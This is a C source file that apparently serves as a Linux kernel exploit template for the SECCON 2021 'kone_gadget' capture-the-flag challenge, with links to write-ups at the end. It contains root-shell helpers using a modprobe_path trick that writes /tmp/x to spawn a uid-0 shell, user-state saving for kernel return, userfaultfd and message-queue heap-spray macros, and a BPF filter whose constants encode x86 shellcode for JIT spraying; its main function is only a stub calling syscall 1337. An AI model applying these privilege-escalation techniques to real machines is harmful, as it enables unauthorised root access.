#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <assert.h>
#include <unistd.h>
#include <string.h>
#include <time.h>
#include <sys/timerfd.h>
#include <signal.h>
#include <sys/mman.h>
#include <pthread.h>
#include <linux/userfaultfd.h>
#include <linux/seccomp.h>
#include <poll.h>
#include <errno.h>
#include <stdbool.h>
#include <stddef.h>
#include <sys/msg.h>
#include <limits.h>
#include <linux/bpf.h>
#include "bpf_insn.h"
#include <sys/socket.h>

#define DEV_PATH "/dev/bank"   // the path the device is placed

#define ulong unsigned long

#define PAGE 0x1000
#define FAULT_ADDR 0xdead0000
#define FAULT_OFFSET PAGE
#define MMAP_SIZE 4*PAGE
#define FAULT_SIZE MMAP_SIZE - FAULT_OFFSET

#define WAIT(void) {getc(stdin); \
                    fflush(stdin);}
#define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
                        } while (0)

#define KMALLOC(qid, msgbuf, N) for(int ix=0; ix!=N; ++ix){\
                        if(msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 0x30, 0) == -1) \
                            errExit("KMALLOC"); \
                        }

static void print_hex8(void* buf, size_t len)
{
    uint64_t* tmp = (uint64_t*)buf;

    for (int i = 0; i < (len / 8); i++) {
        printf("%d: %p ", i, tmp[i]);
        if ((i + 1) % 2 == 0) {
            printf("\n");
        }
    }

    printf("\n");
}

static uint64_t bswap(uint64_t val)
{
    __asm__(
            ".intel_syntax noprefix;"
            "bswap rdi;"
            "mov rax, rdi;"
            ".att_syntax;"
    );
}

static void shell_modprobe()
{
    system("echo '#!/bin/sh' > /tmp/x; \
            echo 'setsid cttyhack setuidgid 0 /bin/sh' >> /tmp/x");
    system("chmod +x /tmp/x");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/y");
    system("chmod +x /tmp/y");
    system("/tmp/y");
}

struct pt_regs {
	ulong r15; ulong r14; ulong r13; ulong r12; ulong bp;
	ulong bx;  ulong r11; ulong r10; ulong r9; ulong r8;
	ulong ax; ulong cx; ulong dx; ulong si; ulong di;
	ulong orig_ax; ulong ip; ulong cs; ulong flags;
    ulong sp; ulong ss;
};

static void print_regs(struct pt_regs *regs)
{
  printf("r15: %lx r14: %lx r13: %lx r12: %lx\n", regs->r15, regs->r14, regs->r13, regs->r12);
  printf("bp: %lx bx: %lx r11: %lx r10: %lx\n", regs->bp, regs->bx, regs->r11, regs->r10);
  printf("r9: %lx r8: %lx ax: %lx cx: %lx\n", regs->r9, regs->r8, regs->ax, regs->cx);
  printf("dx: %lx si: %lx di: %lx ip: %lx\n", regs->dx, regs->si, regs->di, regs->ip);
  printf("cs: %lx flags: %lx sp: %lx ss: %lx\n", regs->cs, regs->flags, regs->sp, regs->ss);
}

uint64_t user_cs,user_ss,user_sp,user_rflags;
static void save_state()
{
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
}

static int create_timer(int leak)
{
  struct itimerspec its;

  its.it_interval.tv_sec = 0;
  its.it_interval.tv_nsec = 0;
  its.it_value.tv_sec = 2;
  its.it_value.tv_nsec = 0;

  int tfd = timerfd_create(CLOCK_REALTIME, 0);
  timerfd_settime(tfd, 0, &its, 0);

  if (leak)
  {
    close(tfd);
    sleep(1);
    return 0;
  }
}

static void get_shell()
{
    if (!getuid())
	{
		puts("Got r00t :)");
		system("/bin/sh");
	}
	exit(0);
}

int userfaultfd(int flags)
{
    return syscall(SYS_userfaultfd, flags);
}

bool is_kernel_ptr(uint64_t val)
{
    return (val & 0xffffffff00000000) == 0xffffffff00000000
        && val != 0xffffffffffffffff;
}

#define R0 BPF_REG_0
#define R1 BPF_REG_1
#define R2 BPF_REG_2
#define R3 BPF_REG_3
#define R4 BPF_REG_4
#define R5 BPF_REG_5
#define R6 BPF_REG_6
#define R7 BPF_REG_7
#define R8 BPF_REG_8
#define R9 BPF_REG_9
#define R10 BPF_REG_10

#define BPF_LOG_BUF_SIZE 65535
char bpf_log_buf[BPF_LOG_BUF_SIZE];

static int bpf_prog_load(enum bpf_prog_type prog_type,
		const struct bpf_insn *insns, int prog_len,
		const char *license, int kern_version){

	union bpf_attr attr = {
		.prog_type = prog_type,
		.insns = (uint64_t)insns,
		.insn_cnt = prog_len / sizeof(struct bpf_insn),
		.license = (uint64_t)license,
		.log_buf = (uint64_t)bpf_log_buf,
		.log_size = BPF_LOG_BUF_SIZE,
		.log_level = 2,
	};
	attr.kern_version = kern_version;
	bpf_log_buf[0] = 0;
	return syscall(__NR_bpf, BPF_PROG_LOAD, &attr, sizeof(attr));
}

static int bpf_create_map(enum bpf_map_type map_type, int key_size, int value_size,
		int max_entries){

	union bpf_attr attr = {
		.map_type = map_type,
		.key_size = key_size,
		.value_size = value_size,
		.max_entries = max_entries
	};
	return syscall(__NR_bpf, BPF_MAP_CREATE, &attr, sizeof(attr));
}

static int bpf_update_elem(int fd ,void *key, void *value,uint64_t flags){
	union bpf_attr attr = {
		.map_fd = fd,
		.key = (uint64_t)key,
		.value = (uint64_t)value,
		.flags = flags,
	};
	return syscall(__NR_bpf, BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));

}

static int bpf_lookup_elem(int fd, void *key, void *value){
	union bpf_attr attr = {
		.map_fd = fd,
		.key = (uint64_t)key,
		.value = (uint64_t)value,
	};
	return syscall(__NR_bpf, BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}

static int install_syscall_filter(void)
{
    int i = 0;
    int scks[0x2];

    struct bpf_insn prog[] = {
        BPF_LD_IMM64(R0, 0x01eb9090),
        BPF_LD_IMM64(R0, 0x75cb010f),
        BPF_LD_IMM64(R0, 0x01ebc030),
        BPF_LD_IMM64(R0, 0x61c3c489),
        BPF_LD_IMM64(R0, 0xc3c78948),
        BPF_EXIT_INSN(),
    };

    int prog_fd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, prog,
            sizeof(prog), "GPL", 0);

    if (prog_fd < 0) {
        errExit("bpf_prog_load");
    }

    int ret = setsockopt(scks[0], SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
            sizeof(prog_fd));

    if (ret < 0) {
        errExit("setsockopt");
    }

    return 0;
}

#define SYS_SECCON 1337

int main(void) 
{
    puts("test");

    syscall(SYS_SECCON, 0x41414141);

    WAIT();

    return 0;
}

// https://balsn.tw/ctf_writeup/20211211-secconctf2021/#kone_gadget
// https://ptr-yudai.hatenablog.com/entry/2021/12/19/232158#Pwnable-365pts-kone_gadget
// https://smallkirby.hatenablog.com/entry/2021/12/12/211601
